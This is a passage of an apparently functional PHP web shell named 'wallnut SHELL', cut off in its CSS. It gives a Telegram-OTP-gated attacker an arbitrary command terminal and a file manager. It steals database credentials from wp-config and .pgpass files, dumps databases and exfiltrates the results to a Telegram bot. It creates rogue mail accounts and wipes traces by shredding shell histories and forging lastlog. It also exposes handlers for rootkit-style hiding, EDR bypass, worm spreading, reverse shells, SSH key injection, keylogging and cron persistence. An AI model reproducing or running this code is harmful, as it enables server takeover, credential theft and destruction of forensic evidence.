    @shell_exec('pkill -f netcat 2>/dev/null');
    @shell_exec('pkill -f ncat 2>/dev/null');
    @shell_exec('sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
    @shell_exec('rm -rf /tmp/* /var/tmp/* 2>/dev/null');
    @shell_exec('history -c 2>/dev/null');
    @shell_exec('unset HISTFILE 2>/dev/null');
    @shell_exec('rm -f ~/.bash_history ~/.mysql_history ~/.psql_history 2>/dev/null');
    @shell_exec('find /home -name ".bash_history" -exec shred -fuz {} \\; 2>/dev/null');
    @shell_exec('echo "Last login: ' . date('Y-m-d H:i:s') . ' from 192.168.1.1" > /var/log/lastlog 2>/dev/null');
    sendTelegramMessage($botToken, $telegramUserId, "ONE CLICK EXECUTED\n\nAll traces cleaned. Session destroyed.");
    session_destroy();
    header('Location: ?');
    exit;
}

if (isset($_GET['db_explorer']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    global $botToken, $telegramUserId;
    $action = isset($_GET['action']) ? $_GET['action'] : 'list';
    $db_type = isset($_GET['type']) ? $_GET['type'] : 'mysql';
    $db_name = isset($_GET['db']) ? $_GET['db'] : '';
    $result = [];
    if ($db_type === 'mysql') {
        $creds = [];
        $config_files = ['/var/www/html/wp-config.php', '/var/www/html/.env', '/home/*/public_html/wp-config.php'];
        foreach ($config_files as $pattern) {
            $files = @glob($pattern);
            if ($files !== false) {
                foreach ($files as $file) {
                    if (is_readable($file)) {
                        $content = @file_get_contents($file);
                        if ($content !== false) {
                            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $db);
                            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $user);
                            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $pass);
                            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $host);
                            if (!empty($db[1]) && !empty($user[1])) {
                                $creds[] = ['db' => $db[1] ?? '', 'user' => $user[1] ?? '', 'pass' => $pass[1] ?? '', 'host' => $host[1] ?? 'localhost'];
                            }
                        }
                    }
                }
            }
        }
        if (empty($creds)) { $creds[] = ['db' => $db_name, 'user' => 'root', 'pass' => '', 'host' => 'localhost']; }
        foreach ($creds as $cred) {
            if ($action === 'list') {
                $cmd = "mysql -h " . escapeshellarg($cred['host']) . " -u " . escapeshellarg($cred['user']) . " " . (!empty($cred['pass']) ? "-p" . escapeshellarg($cred['pass']) : "") . " -e 'SHOW DATABASES' 2>/dev/null";
                $output = @shell_exec($cmd);
                if ($output !== null && !empty($output)) {
                    $result[] = "Databases on {$cred['host']} (user: {$cred['user']}):";
                    $result[] = $output;
                    break;
                }
            } elseif ($action === 'tables' && !empty($db_name)) {
                $cmd = "mysql -h " . escapeshellarg($cred['host']) . " -u " . escapeshellarg($cred['user']) . " " . (!empty($cred['pass']) ? "-p" . escapeshellarg($cred['pass']) : "") . " -D $db_name -e 'SHOW TABLES' 2>/dev/null";
                $output = @shell_exec($cmd);
                if ($output !== null && !empty($output)) {
                    $result[] = "Tables in $db_name:";
                    $result[] = $output;
                    break;
                }
            } elseif ($action === 'dump' && !empty($db_name)) {
                $cmd = "mysqldump -h " . escapeshellarg($cred['host']) . " -u " . escapeshellarg($cred['user']) . " " . (!empty($cred['pass']) ? "-p" . escapeshellarg($cred['pass']) : "") . " $db_name 2>/dev/null | gzip -c | base64 -w 0";
                $output = @shell_exec($cmd);
                if ($output !== null && !empty($output)) {
                    $result[] = "Database $db_name dumped (base64+gzip)";
                    $result[] = substr($output, 0, 500) . "...";
                    break;
                }
            }
        }
        if (empty($result)) { $result[] = "No MySQL credentials found or connection failed"; }
    } elseif ($db_type === 'postgresql') {
        $creds = [];
        $pgpass = '/home/*/.pgpass';
        $files = @glob($pgpass);
        if ($files !== false) {
            foreach ($files as $file) {
                if (is_readable($file)) {
                    $content = @file_get_contents($file);
                    if ($content !== false) {
                        preg_match_all('/([^:]+):([^:]+):([^:]+):([^:]+):([^:]+)/', $content, $matches);
                        for ($i = 0; $i < count($matches[0]); $i++) {
                            $creds[] = ['host' => $matches[1][$i] ?? 'localhost', 'port' => $matches[2][$i] ?? '5432', 'db' => $matches[3][$i] ?? '', 'user' => $matches[4][$i] ?? '', 'pass' => $matches[5][$i] ?? ''];
                        }
                    }
                }
            }
        }
        if (empty($creds)) { $creds[] = ['host' => 'localhost', 'port' => '5432', 'db' => $db_name, 'user' => 'postgres', 'pass' => '']; }
        foreach ($creds as $cred) {
            if ($action === 'list') {
                $cmd = "PGPASSWORD='{$cred['pass']}' psql -h {$cred['host']} -p {$cred['port']} -U {$cred['user']} -l -t 2>/dev/null";
                $output = @shell_exec($cmd);
                if ($output !== null && !empty($output)) {
                    $result[] = "PostgreSQL databases:";
                    $result[] = $output;
                    break;
                }
            } elseif ($action === 'dump' && !empty($db_name)) {
                $cmd = "PGPASSWORD='{$cred['pass']}' pg_dump -h {$cred['host']} -p {$cred['port']} -U {$cred['user']} $db_name 2>/dev/null | gzip -c | base64 -w 0";
                $output = @shell_exec($cmd);
                if ($output !== null && !empty($output)) {
                    $result[] = "PostgreSQL database $db_name dumped";
                    $result[] = substr($output, 0, 500) . "...";
                    break;
                }
            }
        }
        if (empty($result)) { $result[] = "No PostgreSQL credentials found or connection failed"; }
    } elseif ($db_type === 'redis') {
        $cmd = "redis-cli INFO 2>/dev/null";
        $output = @shell_exec($cmd);
        if ($output !== null && !empty($output)) {
            $result[] = "Redis Info:";
            $result[] = substr($output, 0, 500);
        } else {
            $result[] = "Redis not accessible";
        }
    } elseif ($db_type === 'mongodb') {
        $cmd = "mongo --eval 'db.getMongo().getDBNames()' 2>/dev/null";
        $output = @shell_exec($cmd);
        if ($output !== null && !empty($output)) {
            $result[] = "MongoDB databases:";
            $result[] = $output;
        } else {
            $result[] = "MongoDB not accessible";
        }
    } elseif ($db_type === 'sqlite') {
        $sqlite_files = @glob('/var/www/*.sqlite', GLOB_BRACE);
        $sqlite_files = array_merge($sqlite_files, @glob('/home/*/*.sqlite', GLOB_BRACE));
        if (!empty($sqlite_files)) {
            foreach ($sqlite_files as $file) {
                $result[] = "SQLite: $file";
                $cmd = "sqlite3 $file '.tables' 2>/dev/null";
                $output = @shell_exec($cmd);
                if ($output !== null) {
                    $result[] = "  Tables: " . trim($output);
                }
            }
        } else {
            $result[] = "No SQLite files found";
        }
    }
    $msg = "DATABASE EXPLORER RESULTS\n\n" . implode("\n", $result);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    sendJsonResponse(['status' => 'success', 'message' => "DB Explorer done & sent to Telegram"]);
}

if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    global $botToken, $telegramUserId;
    $email = isset($_GET['email']) ? $_GET['email'] : '';
    $password = isset($_GET['pass']) ? $_GET['pass'] : '';
    $domain = isset($_GET['domain']) ? $_GET['domain'] : '';
    if (empty($email) || empty($password)) {
        sendJsonResponse(['status' => 'error', 'message' => 'Email and password required']);
    }
    $domain = $domain ?: (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost');
    $username = explode('@', $email)[0];
    $results = []; $config = [];
    if (function_exists('shell_exec')) {
        $dovecot = @shell_exec('ps aux | grep dovecot | grep -v grep');
        if (empty($dovecot)) {
            $results[] = "Dovecot is not running! IMAP/POP3 inactive.";
        } else {
            $results[] = "Dovecot running (IMAP/POP3)";
            $config['imap'] = "mail.$domain";
            $config['imap_port'] = 993;
        }
        $smtp = @shell_exec('ps aux | grep -E "postfix|exim" | grep -v grep');
        if (empty($smtp)) {
            $results[] = "SMTP server is not running!";
        } else {
            $results[] = "SMTP server running (Postfix/Exim)";
            $config['smtp'] = "mail.$domain";
            $config['smtp_port'] = 587;
        }
        $home = "/home/$username";
        if (!is_dir($home)) @mkdir($home, 0755, true);
        $domain_users = '/etc/domainusers';
        if (is_writable($domain_users)) {
            @file_put_contents($domain_users, "$domain: $username\n", FILE_APPEND);
            $results[] = "User added to /etc/domainusers";
        }
        $passwd_file = "/etc/dovecot/passwd";
        if (!is_dir(dirname($passwd_file))) @mkdir(dirname($passwd_file), 0755, true);
        if (is_writable(dirname($passwd_file))) {
            $hash = @shell_exec("doveadm pw -s SHA512-CRYPT -p " . escapeshellarg($password) . " 2>/dev/null");
            if ($hash) {
                @file_put_contents($passwd_file, "$username@$domain:" . trim($hash) . "\n", FILE_APPEND);
                @chmod($passwd_file, 0644);
                $results[] = "Dovecot password file updated";
            }
        }
        $virtual_file = '/etc/postfix/virtual';
        if (file_exists($virtual_file) && is_writable($virtual_file)) {
            @file_put_contents($virtual_file, "$email $username@$domain\n", FILE_APPEND);
            @shell_exec('postmap /etc/postfix/virtual 2>/dev/null');
            @shell_exec('postfix reload 2>/dev/null');
            $results[] = "Postfix virtual alias added";
        }
        $maildir = "/home/$username/Maildir";
        if (!is_dir($maildir)) {
            @mkdir($maildir, 0700, true);
            @mkdir("$maildir/cur", 0700, true);
            @mkdir("$maildir/new", 0700, true);
            @mkdir("$maildir/tmp", 0700, true);
            @chown($maildir, $username);
            $results[] = "Maildir created at $maildir";
        }
    }
    if (empty($config['imap'])) {
        $config['imap'] = "mail.$domain";
        $config['smtp'] = "mail.$domain";
        $results[] = "Cannot detect mail server, using default: mail.$domain";
    }
    $msg = "MAIL ACCOUNT CREATED\n\n"
         . "Email: $email\n"
         . "Password: $password\n"
         . "Domain: $domain\n\n"
         . "LOGIN SETTINGS:\n"
         . "IMAP Server: {$config['imap']} Port: 993 SSL/TLS\n"
         . "SMTP Server: {$config['smtp']} Port: 587 STARTTLS\n"
         . "Username: $email\n\n"
         . "Details:\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    sendJsonResponse(['status' => 'success', 'message' => 'Mail account created']);
}

function isSafePath($path, $rootPath, $specialDirs) {
    if (strpos($path, $rootPath) === 0) return true;
    foreach ($specialDirs as $dirPath) {
        if ($dirPath && strpos($path, $dirPath) === 0) return true;
    }
    return false;
}

function getImmediateSubDirectories($dir) {
    $subDirs = [];
    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
    $items = @scandir($dir);
    if ($items === false) return $subDirs;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) $subDirs[] = $path;
    }
    return $subDirs;
}

function getAllSubDirectories($dir) {
    $subDirs = [];
    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
    $items = @scandir($dir);
    if ($items === false) return $subDirs;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) {
            $subDirs[] = $path;
            $subDirs = array_merge($subDirs, getAllSubDirectories($path));
        }
    }
    return $subDirs;
}

function getSystemInfo() {
    return [
        'PHP Version' => phpversion(),
        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
        'Server API' => php_sapi_name(),
        'max_execution_time' => ini_get('max_execution_time') . ' seconds',
        'memory_limit' => ini_get('memory_limit'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'post_max_size' => ini_get('post_max_size'),
        'Disabled Functions' => ini_get('disable_functions') ?: 'none',
        'Safe Mode' => ini_get('safe_mode') ? 'On' : 'Off',
        'Operating System' => php_uname('s') . ' ' . php_uname('r'),
        'Current User' => get_current_user(),
        'Document Root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'Unknown',
        'Script Path' => __FILE__
    ];
}

function isTerminalActive() {
    if (!function_exists('shell_exec')) return false;
    if (ini_get('safe_mode')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    if (in_array('shell_exec', array_map('trim', $disabled))) return false;
    return @shell_exec('echo 1') !== null;
}

function breadcrumb($path, $rootPath, $specialDirs) {
    $breadcrumb = '<a href="?path=">Home</a> <span style="color:var(--text-muted);">/</span> ';
    foreach ($specialDirs as $name => $dirPath) {
        if ($dirPath && is_dir($dirPath)) {
            $breadcrumb .= '<a href="?path=' . urlencode($dirPath) . '">' . htmlspecialchars($name) . '</a> <span style="color:var(--text-muted);">/</span> ';
        }
    }
    $relative = str_replace($rootPath, '', $path);
    $parts = array_filter(explode('/', $relative));
    $current = '';
    foreach ($parts as $part) {
        $current .= '/' . $part;
        $breadcrumb .= '<a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a> <span style="color:var(--text-muted);">/</span> ';
    }
    return rtrim($breadcrumb, ' /');
}

$loginError = $loginSuccess = '';
if (isset($_POST['request_otp'])) {
    $otp = sprintf("%06d", mt_rand(0, 999999));
    $_SESSION['otp'] = $otp;
    $_SESSION['otp_time'] = time();
    $message = "OTP CODE: $otp\n\nValid for 5 minutes.";
    $sent = sendTelegramMessage($botToken, $telegramUserId, $message);
    if ($sent) $loginSuccess = "OTP has been sent to Telegram.";
    else { $loginError = "Failed to send OTP."; unset($_SESSION['otp']); }
}

if (isset($_POST['verify_otp'])) {
    $inputOtp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
    if (empty($inputOtp)) $loginError = "Enter OTP code.";
    elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) $loginError = "Request OTP first.";
    elseif (time() - $_SESSION['otp_time'] > 300) { $loginError = "OTP expired."; unset($_SESSION['otp'], $_SESSION['otp_time']); }
    elseif ($inputOtp === $_SESSION['otp']) {
        $_SESSION['loggedin'] = true;
        $_SESSION['login_time'] = time();
        unset($_SESSION['otp'], $_SESSION['otp_time']);
        header('Location: ?');
        exit;
    } else $loginError = "Invalid OTP.";
}

if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] <= 1800) {
    $currentPath = $rootPath;
    if (isset($_GET['path'])) {
        $requestedPath = realpath($_GET['path']);
        if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) {
            $currentPath = $requestedPath;
        } else {
            $error = "Invalid path";
        }
    }
    if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) {
        $error = "Directory not accessible";
        $currentPath = $rootPath;
    }
    
    if (isset($_POST['create']) && isset($_POST['type']) && isset($_POST['name'])) {
        try {
            $type = $_POST['type'];
            $name = trim($_POST['name']);
            if (empty($name)) throw new Exception('Name cannot be empty');
            if (preg_match('/[\/\\\\:\*\?"<>\|]/', $name)) throw new Exception('Invalid characters in name');
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newPath)) throw new Exception('File/folder already exists: ' . $name);
            if ($type === 'file') {
                if (@touch($newPath)) { @chmod($newPath, 0644); $success = 'File created: ' . $name; }
                else { throw new Exception('Failed to create file: ' . $name); }
            } elseif ($type === 'folder') {
                if (@mkdir($newPath, 0755, true)) { $success = 'Folder created: ' . $name; }
                else { throw new Exception('Failed to create folder: ' . $name); }
            } else { throw new Exception('Invalid type'); }
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    
    if (isset($_FILES['upload']) && !empty($_FILES['upload']['name'][0])) {
        try {
            if (!is_writable($currentPath)) throw new Exception('Directory not writable');
            $mode = isset($_POST['upload_mode']) ? $_POST['upload_mode'] : 'normal';
            $targetDirs = [$currentPath];
            if ($mode === 'bulk_shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
            elseif ($mode === 'bulk_deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
            $targetDirs = array_filter($targetDirs, 'is_writable');
            $uploadedFiles = []; $errors = [];
            $fileCount = count($_FILES['upload']['name']);
            for ($i = 0; $i < $fileCount; $i++) {
                if ($_FILES['upload']['error'][$i] !== UPLOAD_ERR_OK) { $errors[] = "Error uploading file " . ($i+1); continue; }
                $safeName = basename($_FILES['upload']['name'][$i]);
                $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName;
                if (file_exists($mainTarget)) { $errors[] = "File already exists: $safeName"; continue; }
                if (@move_uploaded_file($_FILES['upload']['tmp_name'][$i], $mainTarget)) {
                    @chmod($mainTarget, 0644);
                    $uploadedFiles[] = $safeName;
                    foreach ($targetDirs as $dir) {
                        if ($dir !== $currentPath) {
                            @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName);
                            @chmod($dir . DIRECTORY_SEPARATOR . $safeName, 0644);
                        }
                    }
                } else { $errors[] = "Failed to upload: $safeName"; }
            }
            if (!empty($uploadedFiles)) {
                $success = 'Files uploaded: ' . implode(', ', $uploadedFiles);
                if (!empty($errors)) $success .= "\nErrors: " . implode(', ', $errors);
            } else { throw new Exception('No files uploaded successfully'); }
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    
    if (isset($_POST['delete_bulk']) && isset($_POST['file_list'])) {
        try {
            $fileList = isset($_POST['file_list']) ? $_POST['file_list'] : '';
            $deleteMode = isset($_POST['delete_mode']) ? $_POST['delete_mode'] : 'current';
            if (empty(trim($fileList))) throw new Exception('File list cannot be empty');
            $files = preg_split('/[\n,]+/', trim($fileList));
            $files = array_filter(array_map('trim', $files));
            if (empty($files)) throw new Exception('No valid files');
            $targetDirs = [$currentPath];
            if ($deleteMode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
            elseif ($deleteMode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
            $targetDirs = array_filter($targetDirs, 'is_dir');
            $deleted = []; $notFound = []; $errors = [];
            foreach ($targetDirs as $dir) {
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (strpos($path, '..') !== false) continue;
                    if (is_file($path)) {
                        if (@unlink($path)) { $deleted[] = $path; }
                        else { @chmod($path, 0777); if (@unlink($path)) { $deleted[] = $path; } else { $errors[] = $path; } }
                    } elseif (is_dir($path) && $file !== '.' && $file !== '..') {
                        if (deleteDirectory($path)) { $deleted[] = $path . '/'; }
                        else { $errors[] = $path . '/'; }
                    } elseif (!in_array($file, $notFound)) { $notFound[] = $file; }
                }
            }
            $msgParts = [];
            if (!empty($deleted)) $msgParts[] = 'Deleted: ' . count($deleted) . ' files/dirs';
            if (!empty($notFound)) $msgParts[] = 'Not found: ' . implode(', ', array_unique($notFound));
            if (!empty($errors)) $msgParts[] = 'Failed to delete: ' . count($errors) . ' files';
            if (empty($msgParts)) throw new Exception('Nothing deleted');
            $success = 'Bulk delete results: ' . implode('; ', $msgParts);
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    
    if (isset($_POST['rename']) && isset($_POST['target']) && isset($_POST['new_name'])) {
        try {
            $target = isset($_POST['target']) ? $_POST['target'] : '';
            $newName = isset($_POST['new_name']) ? $_POST['new_name'] : '';
            if (empty($target) || empty($newName)) throw new Exception('Target and new name required');
            if (preg_match('/[\/\\\\:\*\?"<>\|]/', $newName)) throw new Exception('Invalid characters in name');
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
            if (!file_exists($targetPath)) throw new Exception('File/folder not found');
            if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Access denied');
            if (file_exists($newPath)) throw new Exception('File/folder already exists');
            if (!@rename($targetPath, $newPath)) throw new Exception('Failed to rename');
            $success = 'Renamed: ' . $target . ' → ' . $newName;
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    
    if (isset($_POST['save_file']) && isset($_POST['file']) && isset($_POST['content'])) {
        try {
            $file = $_POST['file'];
            $content = $_POST['content'];
            $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
            if (!file_exists($filePath) || !is_file($filePath)) throw new Exception('File not found');
            if (!isSafePath($filePath, $rootPath, $specialDirectories)) throw new Exception('Access denied');
            if (!is_writable($filePath)) throw new Exception('File not writable');
            if (@file_put_contents($filePath, $content) === false) throw new Exception('Failed to save file');
            $success = 'File saved: ' . $file;
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    
    if (isset($_GET['action'])) {
        try {
            $action = $_GET['action'];
            $target = isset($_GET['target']) ? $_GET['target'] : '';
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            if (empty($target) || !file_exists($targetPath)) throw new Exception('Target not found');
            if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Access denied');
            switch ($action) {
                case 'delete':
                    if (deleteDirectory($targetPath)) { $success = 'Deleted: ' . $target; }
                    else { throw new Exception('Failed to delete: ' . $target); }
                    break;
                case 'chmod':
                    if (!isset($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) throw new Exception('Invalid permission mode');
                    if (@chmod($targetPath, octdec($_POST['mode']))) { $success = 'Permission changed: ' . $target . ' → ' . $_POST['mode']; }
                    else { throw new Exception('Failed to change permission'); }
                    break;
                case 'download':
                    if (is_dir($targetPath)) throw new Exception('Cannot download directory');
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
                    header('Content-Length: ' . filesize($targetPath));
                    readfile($targetPath);
                    exit;
                default:
                    throw new Exception('Unknown action: ' . $action);
            }
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    
    $terminalActive = isTerminalActive();
    $terminalOutput = '';
    if (isset($_POST['run_command']) && $terminalActive) {
        $command = isset($_POST['command']) ? $_POST['command'] : '';
        if (!empty($command)) {
            $output = @shell_exec($command . ' 2>&1');
            $terminalOutput = $output !== null ? $output : 'Command produced no output.';
        }
    }
}

if (isset($_GET['hide_process_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $proc = isset($_GET['process']) ? $_GET['process'] : basename(__FILE__);
    $result = hide_process_ebpf($proc);
    sendJsonResponse($result);
}

if (isset($_GET['hide_file_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $file = isset($_GET['file']) ? $_GET['file'] : '';
    if (!empty($file)) {
        $result = hide_file_ebpf($file);
        sendJsonResponse($result);
    } else {
        sendJsonResponse(['status' => 'error', 'message' => 'File path required']);
    }
}

if (isset($_GET['edr_bypass']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = edr_bypass_ultimate();
    sendJsonResponse($result);
}

if (isset($_GET['auto_root_modern']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = auto_root_modern();
    sendJsonResponse($result);
}

if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = worm_spread_to_domains(__FILE__);
    sendJsonResponse($result);
}

if (isset($_GET['persistence_advanced']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = persistence_advanced();
    sendJsonResponse($result);
}

if (isset($_GET['cred_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = credential_harvest_advanced();
    sendJsonResponse($result);
}

if (isset($_GET['self_destruct_advanced']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = self_destruct_advanced();
    sendJsonResponse($result);
}

if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = wpscan();
    sendJsonResponse($result);
}

if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = configfinder();
    sendJsonResponse($result);
}

if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = dumpdb();
    sendJsonResponse($result);
}

if (isset($_GET['anti_forensic']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = anti_forensic();
    sendJsonResponse($result);
}

if (isset($_GET['clean_logs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = clean_logs_aggressive();
    sendJsonResponse($result);
}

if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = sshkeys();
    sendJsonResponse($result);
}

if (isset($_GET['ssh_inject']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = inject_ssh_keys(isset($_GET['key']) ? $_GET['key'] : '');
    sendJsonResponse(['status' => 'success', 'message' => 'SSH keys injected & sent to Telegram']);
}

if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = reverseshell();
    sendJsonResponse($result);
}

if (isset($_GET['cloud_creds']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = cloudcreds();
    sendJsonResponse($result);
}

if (isset($_GET['port_scan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = portscan();
    sendJsonResponse($result);
}

if (isset($_GET['create_ssh']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = create_ssh();
    sendJsonResponse($result);
}

if (isset($_GET['create_rdp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = create_rdp();
    sendJsonResponse($result);
}

if (isset($_GET['create_ftp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = create_ftp();
    sendJsonResponse($result);
}

if (isset($_GET['backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = backup();
    sendJsonResponse($result);
}

if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    $result = delete_backup();
    sendJsonResponse($result);
}

if (isset($_GET['auto_prepend']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = auto_prepend_inject();
    sendJsonResponse(['status' => 'success', 'message' => 'Auto prepend injected & sent to Telegram']);
}

if (isset($_GET['clone_shell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = clone_shell();
    sendJsonResponse($result);
}

if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = list_spread();
    sendJsonResponse($result);
}

if (isset($_GET['cpanel_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = cpanel_harvest();
    sendJsonResponse(['status' => 'success', 'message' => 'cPanel harvest done & sent to Telegram']);
}

if (isset($_GET['firewall_killer']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = firewall_killer();
    sendJsonResponse(['status' => 'success', 'message' => 'Firewall killed & sent to Telegram']);
}

if (isset($_GET['network_pivot']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = network_pivot();
    sendJsonResponse($result);
}

if (isset($_GET['keylogger']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = keylogger();
    sendJsonResponse($result);
}

if (isset($_GET['cron_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = cron_persistence();
    sendJsonResponse($result);
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>wallnut SHELL</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0b0e14;
            --bg-secondary: #111820;
            --bg-card: #141d2b;
            --bg-card-hover: #1a2638;
            --bg-input: #0d1520;
            --bg-glass: rgba(20, 29, 43, 0.75);
            --text-primary: #e8edf5;
            --text-secondary: #a8b8c8;
            --text-muted: #6a7a8a;
            --text-accent: #64f0b8;
            --border-subtle: rgba(100, 240, 184, 0.08);
            --border-card: rgba(255, 255, 255, 0.04);
            --border-active: rgba(100, 240, 184, 0.25);
            --glow-accent: rgba(100, 240, 184, 0.06);
            --glow-danger: rgba(255, 70, 85, 0.08);
            --glow-success: rgba(60, 210, 120, 0.08);
            --glow-warning: rgba(255, 180, 50, 0.08);
            --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.4);
            --shadow-glow: 0 0 60px rgba(100, 240, 184, 0.03);
            --radius-sm: 6px;
            --radius-md: 10px;
            --radius-lg: 16px;
            --radius-xl: 20px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:var(--bg-primary); color:var(--text-primary); font-family:var(--font); font-size:14px; line-height:1.6; min-height:100vh; -webkit-font-smoothing:antialiased; }
        ::selection { background:rgba(100,240,184,0.2); color:var(--text-accent); }
        ::-webkit-scrollbar { width:4px; height:4px; }
        ::-webkit-scrollbar-track { background:transparent; }
        ::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.08); border-radius:10px; }
        ::-webkit-scrollbar-thumb:hover { background:rgba(255,255,255,0.15); }
        a { color:var(--text-accent); text-decoration:none; transition:var(--transition); }
